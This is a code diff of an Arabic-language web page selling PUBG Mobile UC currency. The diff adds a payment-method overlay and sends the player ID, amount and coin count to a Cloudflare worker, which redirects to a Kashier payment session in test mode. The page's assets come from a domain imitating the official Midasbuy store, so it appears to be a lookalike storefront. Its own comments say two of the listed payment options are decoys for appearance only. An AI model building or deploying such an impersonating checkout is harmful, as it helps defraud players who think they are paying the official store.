@@ -6,16 +6,17 @@
 <title>PUBG UC · شراء</title>
 <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/6.0.0-beta3/css/all.min.css">
 <style>
+  /* ===== الصفحة الأولى ===== */
   *{margin:0;padding:0;box-sizing:border-box;font-family:'Segoe UI',Tahoma,system-ui,-apple-system,sans-serif}
-  html,body{overscroll-behavior:none;-webkit-overflow-scrolling:touch}
+  html,body{overscroll-behavior:none;-webkit-overflow-scrolling:touch;overflow:hidden;height:100%}
   body{background:#f5f7fa;display:flex;justify-content:center;align-items:flex-start;min-height:100vh}
-  .page{max-width:100%;width:100%}
-  .card{width:100%;background:#fff;color:#1a1a1a;position:relative;overflow:hidden}
+  .page{max-width:100%;width:100%;height:100%;overflow:hidden}
+  .card{width:100%;background:#fff;color:#1a1a1a;position:relative;overflow:hidden;height:100%}
   .top-image{width:100%;line-height:0}
   .top-image img{width:100%;height:auto;display:block}
   .content{padding:18px 16px 24px}
 
-  .user-section{background:#f0f2f5;border-radius:28px;padding:6px 18px 6px 12px;margin-bottom:12px;display:flex;align-items:center;gap:10px;border:1px solid #e0e4e8;flex-direction:row-reverse;height:56px;position:relative}
+  .user-section{background:#f0f2f5;border-radius:28px;padding:6px 18px 6px 12px;margin-bottom:18px;margin-top:-8px;display:flex;align-items:center;gap:10px;border:1px solid #e0e4e8;flex-direction:row-reverse;height:56px;position:relative}
   .user-section i{color:#777;font-size:18px;order:3}
   .user-section input{background:transparent;border:none;outline:none;color:#1a1a1a;font-size:16px;padding:10px 0;flex:1;min-width:100px;text-align:left;direction:ltr;order:1}
   .user-section input::placeholder{color:#999;font-weight:400;text-align:right;direction:rtl;font-size:14px}
@@ -29,7 +30,7 @@
   .player-ok-msg .spinner-icon{display:inline-block;width:14px;height:14px;border:2px solid #ccc;border-top:2px solid #888;border-radius:50%;animation:spin .7s linear infinite;vertical-align:middle}
   @keyframes spin{0%{transform:rotate(0)}100%{transform:rotate(360deg)}}
 
-  .country-section{background:#f0f2f5;border-radius:28px;padding:6px 18px;margin-bottom:24px;display:flex;align-items:center;gap:10px;border:1px solid #e0e4e8;flex-direction:row-reverse;cursor:pointer;position:relative;height:56px}
+  .country-section{background:#f0f2f5;border-radius:28px;padding:6px 18px;margin-bottom:18px;margin-top:-8px;display:flex;align-items:center;gap:10px;border:1px solid #e0e4e8;flex-direction:row-reverse;cursor:pointer;position:relative;height:56px}
   .country-section:active{background:#e8ecf1}
   .country-label{font-size:14px;font-weight:700;color:#555;white-space:nowrap;order:3;pointer-events:none}
   .country-section select{display:none}
@@ -42,7 +43,7 @@
   .custom-dropdown-item:hover{background:#f0f2f5}
   .custom-dropdown-item.selected{background:#e8f0fe;font-weight:600}
 
-  .coin-grid{display:grid;grid-template-columns:repeat(3,1fr);gap:12px;margin-bottom:24px;direction:rtl}
+  .coin-grid{display:grid;grid-template-columns:repeat(3,1fr);gap:12px;margin-bottom:18px;direction:rtl;margin-top:-8px}
   .coin-option{background:#f8f9fc;border-radius:16px;padding:16px 8px;text-align:center;border:2px solid #e8ecf1;transition:.2s;cursor:pointer;position:relative}
   .coin-option:hover{border-color:#d0d5e0;transform:translateY(-1px)}
   .coin-option.selected{border-color:#1a73e8;background:#e8f0fe;box-shadow:0 0 0 1px #1a73e8}
@@ -73,10 +74,309 @@
     .user-section,.country-section{height:50px}
   }
   @media (min-width:421px){ .content{padding-left:24px;padding-right:24px} }
+
+  /* ===== الصفحة الثانية (الدفع) ===== */
+  .payment-page-overlay {
+    display: none;
+    position: fixed;
+    top: 0;
+    left: 0;
+    width: 100%;
+    height: 100%;
+    background: #f4f6f8;
+    z-index: 1500;
+    overflow-y: auto;
+    direction: rtl;
+  }
+  .payment-page-overlay.active {
+    display: block;
+  }
+
+  .payment-page-overlay .main-wrapper {
+    max-width: 1300px;
+    width: 100%;
+    margin: 0 auto;
+    padding: 0 4px;
+  }
+
+  .payment-page-overlay .pay-panel {
+    background: #fff;
+    border: 1px solid #e8ecf0;
+    border-radius: 8px;
+    overflow: hidden;
+    box-shadow: none;
+    max-width: 866px;
+    margin: 0 auto;
+    padding: 0;
+  }
+
+  .payment-page-overlay .pay-header {
+    display: flex;
+    align-items: center;
+    justify-content: space-between;
+    gap: 12px;
+    padding: 14px 12px;
+    border-bottom: 1px solid #f0f3f7;
+    background: #fff;
+  }
+  .payment-page-overlay .pay-header h2 {
+    font-size: 15px;
+    font-weight: 700;
+    color: #0f172a;
+    line-height: 1.35;
+    margin: 0;
+  }
+  .payment-page-overlay .pay-header .country-flag {
+    width: 20px;
+    height: 20px;
+    border-radius: 50%;
+    object-fit: contain;
+    flex-shrink: 0;
+  }
+
+  .payment-page-overlay .pay-body {
+    padding: 1.25rem 1.25rem 1.375rem;
+    display: flex;
+    flex-direction: column;
+    gap: 12px;
+  }
+  @media (max-width: 767px) {
+    .payment-page-overlay .pay-body {
+      padding: 1rem 1rem 1.125rem;
+      gap: 14px;
+    }
+  }
+
+  .payment-page-overlay .radio-card {
+    display: block;
+    position: relative;
+    cursor: pointer;
+    width: 100%;
+    margin: 0 !important;
+  }
+  .payment-page-overlay .radio-card input[type="radio"] {
+    position: absolute;
+    opacity: 0;
+    width: 0;
+    height: 0;
+    pointer-events: none;
+  }
+  .payment-page-overlay .card-content-wrapper {
+    display: flex;
+    align-items: center;
+    width: 100%;
+    gap: 1rem;
+    padding-top: 16px;
+    padding-bottom: 16px;
+    padding-inline-start: 14px;
+    padding-inline-end: 8px;
+    border: 2px solid #f0f3f7;
+    border-radius: 8px;
+    background: #fff;
+    transition: border-color 150ms ease,
+                background-color 150ms ease,
+                box-shadow 150ms ease;
+  }
+  .payment-page-overlay .radio-card:hover .card-content-wrapper {
+    border-color: #e8ecf0;
+  }
+  .payment-page-overlay .radio-card input[type="radio"]:checked + .card-content-wrapper {
+    border-color: #0194fe;
+    background-color: rgba(1, 148, 254, 0.08);
+    box-shadow: 0 2px 8px rgba(1, 148, 254, 0.12);
+  }
+
+  .payment-page-overlay .check-icon {
+    width: 20px;
+    height: 20px;
+    min-width: 20px;
+    max-width: 20px;
+    border: 2px solid #e3e3e3;
+    border-radius: 50%;
+    position: relative;
+    flex-shrink: 0;
+    background: #fff;
+    margin-inline-end: 2px;
+    transition: width 200ms linear,
+                height 200ms linear,
+                min-width 200ms linear,
+                max-width 200ms linear,
+                background-color 200ms linear,
+                border-color 200ms linear,
+                margin-inline-end 200ms linear,
+                transform 200ms linear,
+                box-shadow 200ms linear;
+  }
+  .payment-page-overlay .check-icon::before {
+    content: "";
+    position: absolute;
+    inset: 0;
+    background-image: url("data:image/svg+xml,%3Csvg width='12' height='9' viewBox='0 0 12 9' fill='none' xmlns='http://www.w3.org/2000/svg'%3E%3Cpath d='M1 4.5L4.5 8L11 1' stroke='white' stroke-width='2' stroke-linecap='round' stroke-linejoin='round'/%3E%3C/svg%3E");
+    background-repeat: no-repeat;
+    background-position: center;
+    background-size: 12px;
+    opacity: 0;
+    transition: opacity 200ms linear;
+  }
+  .payment-page-overlay .radio-card input[type="radio"]:checked + .card-content-wrapper .check-icon {
+    width: 24px;
+    height: 24px;
+    min-width: 24px;
+    max-width: 24px;
+    background: #0194fe;
+    border-color: #0194fe;
+    box-shadow: 0 0 0 2px rgba(1, 148, 254, 0.15);
+    transform: translateX(-4px);
+    margin-inline-end: 6px;
+  }
+  .payment-page-overlay .radio-card input[type="radio"]:checked + .card-content-wrapper .check-icon::before {
+    opacity: 1;
+    background-size: 13px;
+  }
+
+  .payment-page-overlay .card-content {
+    display: flex;
+    align-items: center;
+    flex-wrap: wrap;
+    gap: 4px;
+    flex: 1;
+    min-width: 0;
+    justify-content: flex-start;
+  }
+  .payment-page-overlay .card-content img {
+    vertical-align: middle;
+    max-width: 100%;
+    height: auto;
+    padding: 4px;
+    display: block;
+  }
+
+  .payment-page-overlay .card-content img[alt="visa"] { width: 55px; }
+  .payment-page-overlay .card-content img[alt="MasterCard"] { width: 42px; }
+  .payment-page-overlay .card-content img[alt="Mada"] { width: 55px; }
+  .payment-page-overlay .card-content img[alt="Apple Pay & Google Pay"] {
+    max-height: 28px;
+    max-width: calc(100% - 175px);
+  }
+  .payment-page-overlay .card-content img[alt="wallets"] { width: 300px; }
+  .payment-page-overlay .card-content img[alt="instapay"] {
+    max-height: 25px;
+    padding: 4px 0;
+  }
+  .payment-page-overlay .card-content img[alt="Fawry"] { width: 100px; }
+
+  .payment-page-overlay .main-payment-badge {
+    position: absolute;
+    top: 8px;
+    left: 10px;
+    background: #0194fe;
+    color: #fff;
+    padding: 2px 8px;
+    border-radius: 4px;
+    font-size: 10px;
+    font-weight: 600;
+    line-height: 1.5;
+    pointer-events: none;
+  }
+
+  .payment-page-overlay #pay-btn-container.fixed-bottom {
+    position: fixed !important;
+    bottom: 8px;
+    left: 0;
+    right: 0;
+    margin-bottom: 0 !important;
+    box-shadow: none;
+    border-top: 1px solid #e8ecf0;
+    background: #fff;
+    padding: 0 5px !important;
+    width: 100%;
+    z-index: 1000;
+  }
+
+  .payment-page-overlay #pay-btn-container .container {
+    background: #fff !important;
+    border-radius: 8px !important;
+    max-width: 100%;
+    width: 100%;
+    margin: 0 auto;
+    padding: 8px 12px;
+  }
+
+  .payment-page-overlay #pay-btn-container .col-12.col-lg-6 {
+    width: 100%;
+    max-width: 100%;
+    padding: 0;
+  }
+
+  .payment-page-overlay .pay-btn {
+    width: 100% !important;
+    height: 51px;
+    background: #0194fe !important;
+    border: 2px solid #0194fe !important;
+    border-radius: 8px !important;
+    color: #fff !important;
+    font-family: DinNext, "Segoe UI", Tahoma, Arial, sans-serif !important;
+    font-size: 17px !important;
+    font-weight: 700 !important;
+    line-height: 1.7 !important;
+    cursor: pointer;
+    display: flex;
+    align-items: center;
+    justify-content: space-between;
+    padding: 0.5rem 1.25rem;
+    box-shadow: none !important;
+    transition: filter 150ms ease;
+  }
+
+  .payment-page-overlay .pay-btn span {
+    font-family: inherit !important;
+    font-size: inherit !important;
+    font-weight: inherit !important;
+    line-height: inherit !important;
+    color: inherit !important;
+  }
+
+  .payment-page-overlay .pay-btn:hover {
+    background: #0194fe !important;
+    border-color: #0194fe !important;
+    box-shadow: none !important;
+  }
+
+  .payment-page-overlay .pay-btn:disabled {
+    opacity: 0.7;
+    cursor: not-allowed;
+  }
+
+  .payment-page-overlay .pay-btn .fas.fa-arrow-left {
+    font-family: "Font Awesome 5 Free", "Font Awesome 5 Pro", sans-serif !important;
+    font-weight: 900 !important;
+    font-size: 18px !important;
+    line-height: 1;
+    display: inline-flex;
+    align-items: center;
+  }
+
+  .payment-page-overlay .pay-btn .fas.fa-arrow-left::before {
+    content: "\f060";
+  }
+
+  @media (max-width: 767px) {
+    .payment-page-overlay .main-wrapper { padding: 0 4px; }
+    .payment-page-overlay .pay-panel { max-width: 100%; margin: 0 auto; padding: 0; }
+    .payment-page-overlay .card-content-wrapper { padding-top: 14px; padding-bottom: 14px; }
+    .payment-page-overlay .card-content img[alt="Apple Pay & Google Pay"] { max-width: 100%; }
+    .payment-page-overlay .card-content img[alt="wallets"] { width: 250px; }
+    .payment-page-overlay .card-content img[alt="Fawry"] { width: 85px; }
+    .payment-page-overlay .pay-btn { font-size: 17px !important; }
+  }
+  @media (min-width: 768px) {
+    .payment-page-overlay .pay-header { display: none; }
+  }
 </style>
 </head>
 <body>
 
+<!-- ===== الصفحة الأولى ===== -->
 <div class="page active" id="page1">
   <div class="card">
     <div class="top-image">
@@ -86,7 +386,7 @@
     <div class="content">
       <div class="user-section" id="userSection">
         <i class="fas fa-user"></i>
-        <input type="text" id="username" inputmode="numeric" placeholder="ID معرف اللاعب" maxlength="15" autocomplete="off">
+        <input type="text" id="username" inputmode="numeric" placeholder="ID معرف اللاعب" maxlength="15" autocomplete="off" enterkeyhint="done">
         <span class="player-ok-msg" id="playerOkMsg"><span class="spinner-icon"></span></span>
         <span class="player-confirm-msg" id="playerConfirmMsg"><i class="fas fa-check-circle"></i> تم تحديد اللاعب</span>
         <span class="player-error-msg" id="playerErrorMsg"><i class="fas fa-exclamation-circle"></i> معرف اللاعب غير صحيح</span>
@@ -107,6 +407,88 @@
   </div>
 </div>
 
+<!-- ===== صفحة الدفع (الصفحة الثانية) ===== -->
+<div class="payment-page-overlay" id="paymentPageOverlay">
+  <div class="main-wrapper">
+    <div class="pay-panel">
+
+      <div class="pay-header">
+        <h2>يرجى اختيار وسيلة الدفع</h2>
+        <img class="country-flag"
+             src="https://pubgmobil-midasbuy.github.io/midasbuy.com/8.svg"
+             alt="Egypt">
+      </div>
+
+      <div class="pay-body">
+
+        <!-- ✅ بطاقة (card) - تعمل فعلياً -->
+        <label class="radio-card">
+          <input type="radio" name="payment" value="card" checked>
+          <div class="card-content-wrapper">
+            <span class="check-icon"></span>
+            <div class="card-content">
+              <img src="https://pubgmobil-midasbuy.github.io/midasbuy.com/1.png" alt="visa">
+              <img src="https://pubgmobil-midasbuy.github.io/midasbuy.com/2.png" alt="MasterCard">
+              <img src="https://pubgmobil-midasbuy.github.io/midasbuy.com/3.png" alt="Mada">
+              <img src="https://pubgmobil-midasbuy.github.io/midasbuy.com/4.png" alt="Apple Pay &amp; Google Pay">
+            </div>
+            <span class="main-payment-badge">أساسية</span>
+          </div>
+        </label>
+
+        <!-- ✅ محفظة (wallet) - تعمل فعلياً -->
+        <label class="radio-card">
+          <input type="radio" name="payment" value="wallet">
+          <div class="card-content-wrapper">
+            <span class="check-icon"></span>
+            <div class="card-content">
+              <img src="https://pubgmobil-midasbuy.github.io/midasbuy.com/5.png" alt="wallets">
+            </div>
+          </div>
+        </label>
+
+        <!-- ✅ InstaPay - منظر عادي (بدون وظيفة) -->
+        <label class="radio-card">
+          <input type="radio" name="payment" value="instapay">
+          <div class="card-content-wrapper">
+            <span class="check-icon"></span>
+            <div class="card-content">
+              <img src="https://pubgmobil-midasbuy.github.io/midasbuy.com/6.png" alt="instapay">
+            </div>
+          </div>
+        </label>
+
+        <!-- ✅ Fawry - منظر عادي (بدون وظيفة) -->
+        <label class="radio-card">
+          <input type="radio" name="payment" value="fawry">
+          <div class="card-content-wrapper">
+            <span class="check-icon"></span>
+            <div class="card-content">
+              <img src="https://pubgmobil-midasbuy.github.io/midasbuy.com/7.png" alt="Fawry">
+            </div>
+          </div>
+        </label>
+
+      </div>
+    </div>
+  </div>
+
+  <!-- زر الدفع -->
+  <div class="col-12 fixed-bottom" id="pay-btn-container">
+    <div class="container px-3 py-2">
+      <div class="col-12 col-lg-6 p-0 d-flex justify-content-md-start justify-content-center">
+        <button class="col-12 btn px-5 py-2 rounded-1 text-light pay-btn d-flex justify-content-between"
+                style="height:51px"
+                id="finalPayBtn">
+          <span id="btn-text">اختر وسيلة الدفع</span>
+          <span class="fas fa-arrow-left"></span>
+        </button>
+      </div>
+    </div>
+  </div>
+</div>
+
+<!-- ===== عناصر التحميل والتوست ===== -->
 <div class="loading-overlay" id="loadingOverlay">
   <div class="loading-card">
     <div class="loading-spinner"></div>
@@ -121,14 +503,9 @@
 (function () {
   'use strict';
 
-  /* =====================================================
-     رابط الـ Worker بتاعك
-     ===================================================== */
   const WORKER_URL = 'https://new.ryryryryryryryry333.workers.dev/';
-
   const UC_ICON = 'https://raw.githubusercontent.com/pubgmobil-midasbuy/midasbuy.com/main/IMG_٢٠٢٦٠٩٠٠٧_٢١٠٧٢٨.webp';
 
-  /* ====== الأسعار الأساسية بالجنيه المصري ====== */
   const EGP_RATE = 48;
   const coinPackages = [
     { coins: 500,   egp: 280  },
@@ -139,7 +516,6 @@
     { coins: 16000, egp: 8960 }
   ];
 
-  /* ====== قائمة العملات ====== */
   const currencyList = [
     { code:'EGP', name:'🇪🇬 جنيه مصري',        symbol:'ج.م',  rate:48.00 },
     { code:'USD', name:'🇺🇸 دولار أمريكي',      symbol:'$',    rate:1.00 },
@@ -199,7 +575,9 @@
         countrySelect = $('countrySelect'), countryDisplay = $('countryDisplay'),
         countrySection = $('countrySection'), customDropdown = $('customDropdown'),
         coinGrid = $('coinGrid'), proceedBtn = $('proceedBtn'),
-        loadingOverlay = $('loadingOverlay'), toast = $('toast');
+        loadingOverlay = $('loadingOverlay'), toast = $('toast'),
+        paymentPageOverlay = $('paymentPageOverlay'),
+        finalPayBtn = $('finalPayBtn');
 
   let selectedCoins = null, selectedEGP = null;
   let coinOptions = [], confirmTimer = null, okTimer = null, lastUsername = '';
@@ -343,6 +721,17 @@
     if (this.value.trim() !== lastUsername) lastUsername = '';
   });
 
+  usernameInput.addEventListener('paste', function () {
+    setTimeout(() => { this.blur(); }, 50);
+  });
+
+  usernameInput.addEventListener('keydown', function (e) {
+    if (e.key === 'Enter') {
+      e.preventDefault();
+      this.blur();
+    }
+  });
+
   usernameInput.addEventListener('blur', function () {
     const val = this.value.trim();
     if (isValidUsername(val)) {
@@ -359,10 +748,8 @@
     }
   });
 
-  /* ====== زر متابعة الدفع (متصل بالـ Worker) ====== */
-  proceedBtn.addEventListener('click', async () => {
-    if (isSubmitting) return;
-
+  /* ====== زر متابعة الدفع (فتح صفحة الدفع) ====== */
+  proceedBtn.addEventListener('click', () => {
     const username = usernameInput.value.trim();
     if (!isValidUsername(username)) {
       usernameInput.focus();
@@ -377,49 +764,92 @@
       return;
     }
 
+    // ✅ حفظ حالة صفحة الدفع في السجل
+    history.pushState({ page: 'payment' }, '', '');
+
+    paymentPageOverlay.classList.add('active');
+    document.body.style.overflow = 'hidden';
+  });
+
+  /* ✅ التعامل مع زر الرجوع */
+  window.addEventListener('popstate', function (e) {
+    if (paymentPageOverlay.classList.contains('active')) {
+      paymentPageOverlay.classList.remove('active');
+      document.body.style.overflow = '';
+    }
+  });
+
+  /* ====== زر الدفع النهائي ====== */
+  finalPayBtn.addEventListener('click', async () => {
+    if (isSubmitting) return;
+
+    // ✅ تحديد طريقة الدفع المختارة
+    const selectedMethod = document.querySelector('input[name="payment"]:checked');
+    
+    // ✅ إذا كانت الطريقة غير card أو wallet → لا تفعل شيئاً (الخيارات الثالثة والرابعة للمنظر فقط)
+    if (!selectedMethod || (selectedMethod.value !== 'card' && selectedMethod.value !== 'wallet')) {
+      return;
+    }
+
+    const method = selectedMethod.value;
+
     isSubmitting = true;
-    proceedBtn.disabled = true;
-    proceedBtn.innerHTML = '<i class="fas fa-spinner fa-spin"></i> جاري التحويل...';
+    finalPayBtn.disabled = true;
     showLoading();
 
     try {
+      const orderId = `ORD-${Date.now()}-${Math.random().toString(36).slice(2, 8)}`;
+
       const response = await fetch(WORKER_URL, {
         method: 'POST',
         headers: { 'Content-Type': 'application/json' },
         body: JSON.stringify({
           amount: selectedEGP.toFixed(2),
           coins: selectedCoins,
-          playerId: username,
-          order: `ORD-${Date.now()}-${Math.random().toString(36).slice(2, 8)}`,
-          email: 'customer@example.com'
-        })
+          playerId: usernameInput.value.trim(),
+          order: orderId,
+          email: 'customer@example.com',
+          method: method,
+        }),
       });
 
       const data = await response.json();
 
-      if (data.sessionUrl) {
-        window.location.href = data.sessionUrl;
-      } else if (data._id) {
-        window.location.href = `https://payments.kashier.io/session/${data._id}?mode=test`;
+      const sessionUrl = data.sessionUrl
+        || (data._id ? `https://payments.kashier.io/session/${data._id}?mode=test` : null);
+
+      if (sessionUrl) {
+        // ✅ حفظ حالة كاشير قبل التوجيه (بحيث عند الرجوع نرجع لصفحة الدفع)
+        history.pushState({ page: 'kashier' }, '', '');
+
+        // ✅ حفظ البيانات في sessionStorage للعودة إليها
+        sessionStorage.setItem('paymentState', JSON.stringify({
+          page: 'payment',
+          playerId: usernameInput.value.trim(),
+          coins: selectedCoins,
+          egp: selectedEGP,
+          currency: countrySelect.value,
+          timestamp: Date.now()
+        }));
+
+        // ✅ التوجيه لكاشير (بدون إعادة تحميل - نفس الصفحة)
+        window.location.href = sessionUrl;
       } else {
         console.error('Kashier response:', data);
         showToast('حدث خطأ أثناء إنشاء الدفع، حاول مرة أخرى');
         hideLoading();
         isSubmitting = false;
-        proceedBtn.disabled = false;
-        proceedBtn.innerHTML = 'متابعة الدفع <i class="fas fa-arrow-left"></i>';
+        finalPayBtn.disabled = false;
       }
     } catch (error) {
       console.error('Error:', error);
       showToast('تعذر الاتصال بالخادم، تحقق من الإنترنت');
       hideLoading();
       isSubmitting = false;
-      proceedBtn.disabled = false;
-      proceedBtn.innerHTML = 'متابعة الدفع <i class="fas fa-arrow-left"></i>';
+      finalPayBtn.disabled = false;
     }
   });
 
-  /* ====== التهيئة ====== */
   buildCurrencySelect();
   buildCoinGrid();
   buildCustomDropdown();
